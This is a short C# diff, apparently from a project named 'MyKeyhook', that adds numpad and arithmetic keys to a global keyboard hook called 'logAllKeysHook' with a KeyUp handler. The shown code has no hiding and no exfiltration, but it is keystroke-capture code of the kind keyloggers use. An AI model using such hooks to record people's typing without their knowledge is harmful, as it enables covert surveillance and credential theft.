@@ -64,6 +64,7 @@ namespace MyKeyhook
             logAllKeysHook.HookedKeys.Add(Keys.RControlKey);
             logAllKeysHook.HookedKeys.Add(Keys.LShiftKey);
             logAllKeysHook.HookedKeys.Add(Keys.RShiftKey);
+            //init number keys
             logAllKeysHook.HookedKeys.Add(Keys.D0);
             logAllKeysHook.HookedKeys.Add(Keys.D1);
             logAllKeysHook.HookedKeys.Add(Keys.D2);
@@ -76,8 +77,25 @@ namespace MyKeyhook
             logAllKeysHook.HookedKeys.Add(Keys.D9);
             logAllKeysHook.HookedKeys.Add(Keys.Space);
             //add more keys to logAllKeysHook here please ----------------------------------------------------------------------------------------------------
-            //
-            //
+            //init numpad keys
+            logAllKeysHook.HookedKeys.Add(Keys.NumPad0);
+            logAllKeysHook.HookedKeys.Add(Keys.NumPad1);
+            logAllKeysHook.HookedKeys.Add(Keys.NumPad2);
+            logAllKeysHook.HookedKeys.Add(Keys.NumPad3);
+            logAllKeysHook.HookedKeys.Add(Keys.NumPad4);
+            logAllKeysHook.HookedKeys.Add(Keys.NumPad5);
+            logAllKeysHook.HookedKeys.Add(Keys.NumPad6);
+            logAllKeysHook.HookedKeys.Add(Keys.NumPad7);
+            logAllKeysHook.HookedKeys.Add(Keys.NumPad8);
+            logAllKeysHook.HookedKeys.Add(Keys.NumPad9);
+            logAllKeysHook.HookedKeys.Add(Keys.NumLock);
+            logAllKeysHook.HookedKeys.Add(Keys.Divide);
+            logAllKeysHook.HookedKeys.Add(Keys.Add);
+            logAllKeysHook.HookedKeys.Add(Keys.Multiply);
+            logAllKeysHook.HookedKeys.Add(Keys.Enter);
+            logAllKeysHook.HookedKeys.Add(Keys.Decimal);
+            
+
             //------------------------------------------------------------------------------------------------------------------------------------------------
 
             logAllKeysHook.KeyUp += new KeyEventHandler(logAll_keyUp);
